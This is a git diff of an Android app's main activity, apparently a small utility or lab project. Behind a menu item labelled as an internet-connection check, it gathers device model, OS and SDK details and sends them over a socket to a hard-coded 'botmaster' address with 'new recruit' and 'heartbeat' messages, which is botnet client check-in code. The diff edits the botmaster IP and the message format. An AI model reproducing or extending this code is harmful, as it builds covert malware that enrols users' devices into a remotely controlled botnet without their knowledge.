@@ -74,17 +74,30 @@ public class MainActivity extends AppCompatActivity {
                 view.clearAnimation();
             }
         });
-        GetLocalIP();
+        //new GetLocalIP();
 
     }
 
-    private void GetLocalIP() {
+    public void GetLocalIP(){
+        /*
+        DatagramSocket dgsocket = null;
+
+        try {
+            DatagramSocket datagramSocket = dgsocket = new DatagramSocket();
+            dgsocket.connect(InetAddress.getByName("8.8.8.8"), 1002);
+            ipinet = dgsocket.getLocalAddress().getHostAddress();
+        } catch (SocketException | UnknownHostException e) {
+            e.printStackTrace();
+        }
+        */
+        String ipinet="127.0.0.1";
         ConnectivityManager connectivitymanager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
         NetworkInfo activenetworkInfo = connectivitymanager.getActiveNetworkInfo();
         if (activenetworkInfo != null) {
-            mString2Byte.setText("Internet available\n");
+            mString2Byte.setText("Internet available\n"+ipinet+"\n");
             status = true;
-            localip = connectivitymanager.getActiveNetworkInfo().toString();
+            //localip = connectivitymanager.getActiveNetworkInfo().toString();
+            localip = ipinet;
         } else {
             mString2Byte.setText("Internet NOT available\n");
         }
@@ -118,44 +131,6 @@ public class MainActivity extends AppCompatActivity {
         //mString2Byte.setText(Arrays.toString(plain2byte));
     }
 
-    void convertImage2Byte() {
-        /*
-        //Invoke the photogallery
-        //Intent photoPickerIntent = new Intent(Intent.ACTION_PICK);
-
-        //Where to find the data
-        File pictureDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS+"/freepik.jpg");
-        mString2Byte.append(pictureDirectory.toString());
-        try {
-            //byte[] image2byte = Files.readAllBytes(pictureDirectory.toPath());
-            byte[] image2byte = (byte[]) Files.readAllBytes(Paths.get("logo.jpg"));
-            int i2blength = image2byte.length;
-            int i;
-            mString2Byte.append("Array length : " + i2blength + "\n");
-            for (i = 0; i < i2blength; i++) {
-                mString2Byte.append("Array on place : " + i + "__Value : " + image2byte[i] + "\n");
-
-            }
-
-        }catch (IOException e) {
-            e.printStackTrace();
-        } */
-
-
-
-            // Uri representation
-        //Uri data = Uri.parse(pictureDirectorypath);
-
-        // Set data and type. This gets all the images
-        //photoPickerIntent.setDataAndType(data,"image/*");
-
-        // invoke the activity and get something back from it
-
-
-
-    }
-
-
     void menu3WasClicked(){
         mString2Byte.append("Check internet connection\n");
         String various_os = System.getProperty("os.version"); // OS version
@@ -164,7 +139,7 @@ public class MainActivity extends AppCompatActivity {
         String various_model = android.os.Build.MODEL;            // Model
         String various_product = android.os.Build.PRODUCT;          // Product
         String bot_username = "bot" + UUID.randomUUID().toString();
-        String[] botmaster = {"192.168.1.11",
+        String[] botmaster = {"192.168.1.8",
                 "9999",
                 "1",
                 "\n Device name : "+various_device+" \n Model : "+various_model+" \n OS : "+various_os+" \n product : "+various_product+" \n SDK : "+various_sdk+" \n",
@@ -275,7 +250,7 @@ public class MainActivity extends AppCompatActivity {
                 s1 = new Socket(botmaster_ip,botmaster_port_int);
                 pw = new PrintWriter(s1.getOutputStream());
                 if(botmaster_type == "1"){
-                    message = "new recruit" + botmaster_myname + " " + botmaster_message;
+                    message = "new recruit." + botmaster_myname + "." + botmaster_message;
                     result = "new bot";
                 } else {
                     message = "heartbeat" + botmaster_myname;
@@ -314,7 +289,7 @@ public class MainActivity extends AppCompatActivity {
         } else {
             if (itemThatWasClickedId == R.id.action_convertimage) {
                 Toast.makeText(this, "Image 2 byte array", Toast.LENGTH_LONG).show();
-                convertImage2Byte();
+                //convertImage2Byte();
                 return true;
             } else {
                 if (itemThatWasClickedId == R.id.action_menu3) {
